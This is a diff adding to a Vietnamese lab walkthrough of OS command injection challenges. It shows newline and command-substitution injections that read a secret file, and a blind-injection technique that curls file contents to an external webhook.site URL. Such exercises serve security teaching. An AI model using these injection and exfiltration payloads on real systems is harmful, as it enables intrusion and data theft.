@@ -246,5 +246,92 @@ Thử thách này gồm 7 level.
     Thực hiện gửi lại gói tin với nội dung như sau:
 
     ```bash
-    
+    command=ping&target=8.8.8.8%0acat /3ef1cafd_secret.txt
     ``` 
+
+    ![alt text](IMG/4/image.png)
+
+- Ngoài ra ta còn có thể sử dụng lệnh sử dụng một cách khác ngoài cách chèn thêm một dấu `\n` trong gói tin `Request`. Sử dụng `command substitution` (mệnh lệnh thay thế).
+
+    ![alt text](IMG/4/image-1.png)
+
+- Khi ta gõ:
+
+    ```bash
+    dig `ls /`
+    dig $(ls /)
+    ```
+
+    thì chương trình sẽ thực hiện chạy lệnh `ls /` rùi lấy nguyên cái kết quả của lệnh trên đặt luôn sau lệnh dig. Thì lúc này thì lệnh dig sẽ nhận được cái output đó rùi in ra lỗi, nhưng ta không quan tâm đó là lỗi gì, ta chỉ quan tâm lệnh này cái output của nó có hiện cái output của lệnh `ls /`, đó là lý do tại sao lại lợi dụng lệnh dig mà không phải các lệnh khác.
+
+    ![alt text](IMG/4/image-2.png) 
+
+    ![alt text](IMG/4/image-3.png)
+
+- Lệnh ping sẽ cố gắng ping nguyên cái kết quả ở output rùi chửi một câu gắn gọn ở localhost. Vì ping phản hồi lại ít chữ. Cho nền minh sẽ sử dụng lệnh `dig`.
+
+- Dùng lệnh dig thì do lệnh dig chửi nhiều hơn và trong lúc chửi nó vô tinh in ra kết quả của lệnh `ls`. Nếu chặn hết nối dài thì ta sẽ sử dụng lệnh chèn thêm.
+
+    ![alt text](IMG/4/image-4.png)    
+
+> 3 bài lab đầu đều thử thách về filter
+
+## LAB4
+
+- Lab4 là một lever khác, họ không in ra output chi tiết mà chỉ in ra 2 trạng thái là `backup thành công` hoặc `backup không thành công`.
+
+- Để giải LAB4 ta suy nghĩ theo các hướng ngoại bằng việc trả lời câu hỏi "có các nào gửi output ra 1 server ngoài hay không.
+
+    ![alt text](IMG/4/image-5.png)
+
+- Lệnh curl dùng để gửi một gói tin http hoặc 1 cú request ra ngoài, tức là bh ta sẽ sử dụng lệnh cat để đọc gói tin rùi curl kết quả đó ra ngoài.
+
+- Bước 1: chúng ta kiểm tra rằng server này có thể bắn được gói tin nào hay không. Sử dụng lệnh curl bằng việc sử dụng chèn command có lệnh curl vào một địa chỉ server (ở đây tay sử dụng `webhook`).
+
+    ```bash
+    command=backup&target=tungdeptrai.zip; curl https://webhook.site/fb779aa2-4ae3-4567-9de7-e9e1911578b6 %23
+    ```
+
+    Giải thích: `%23` là kí tự `#`, đây là bắt đầu comment và sẽ loại bỏ hết tất cả những câu lệnh sau `#`, địa chỉ webhook ở mỗi mãy 1 khác nhau.
+
+    ![alt text](IMG/4/image-6.png)
+
+    ![alt text](IMG/4/image-7.png)
+
+    Sau khi chạy câu lệnh xong ta thấy có một gói tin entry được gửi cho mỗi trang webhook của mình.
+
+    Điều này chứng minh được rằng vế đầu tiên là có lệnh curl và có cả internet. Vì có nhiều con server ứng dụng weeb đứng trước mặt plugin, vì nhwuxng hệ thống web lớn sẽ có 1 load bylansingm, vì hầu hết các con web sẽ nằm sau một con proxy nào đó, và rất có thẻ ứng dụng web đó không ra ngoài lun. Thật may mắn bài này có internet và có lệnh curl.
+
+- Sau khi biết được chương trình cho phép lệnh curl thì ta thực hiện viết command để có thể đọc được lệnh ls bằng việc chỉnh burp suite như sau:
+
+    ```bash
+    # sử dụng từ khóa: how to use curl to send a file để có thể tra được câu lệnh curl
+    command=backup&target=tungdeptrai.zip; ls / > /tmp/tungdvan.txt; curl -d @/tmp/tungdvan.txt https://webhook.site/fb779aa2-4ae3-4567-9de7-e9e1911578b6 %23
+    ```
+
+    Giải thích: ban đầu chạy lệnh `ls /` và lấy kết quả đó ghi vào file `/tmp/tungdvan.txt` thông qua toán tử `>`. Sau đó sử dụng lệnh curl để gửi cái file `/tmp/tungdvan.txt` vào server của webhook.
+
+    ![alt text](IMG/4/image-8.png)
+
+    Lúc này ta nhận được 1 gói tin là trong đó ta biết file có flag là `aefd123cdf_secret.txt`. Ta thực hiện viết lại lệnh rùi gửi lần nữa.
+
+    ```bash
+    command=backup&target=tungdeptrai.zip; cat /aefd123cdf_secret.txt > /tmp/tungdvan.txt; curl -d @/tmp/tungdvan.txt https://webhook.site/fb779aa2-4ae3-4567-9de7-e9e1911578b6 %23
+    ```
+
+    ![alt text](IMG/4/image-9.png)
+
+    Lúc này ta lấy được flag.
+
+    ![alt text](IMG/4/image-10.png)
+
+    > có thể dùng `command=backup&target=tungdeptrai.zip; ls / > /tmp/tungdvan.txt; curl --data-binary @/tmp/tungdvan.txt https://webhook.site/fb779aa2-4ae3-4567-9de7-e9e1911578b6 %23` để in ra đẹp hơn.
+
+
+    ![alt text](IMG/4.1/image.png)
+
+    LAB5 sẽ không thể sử dụng lệnh curl và không có internet, vậy ta làm như thế nào, hí hí.
+
+    ![alt text](IMG/4.1/image-1.png)
+
+    ![alt text](IMG/4.1/image-2.png)
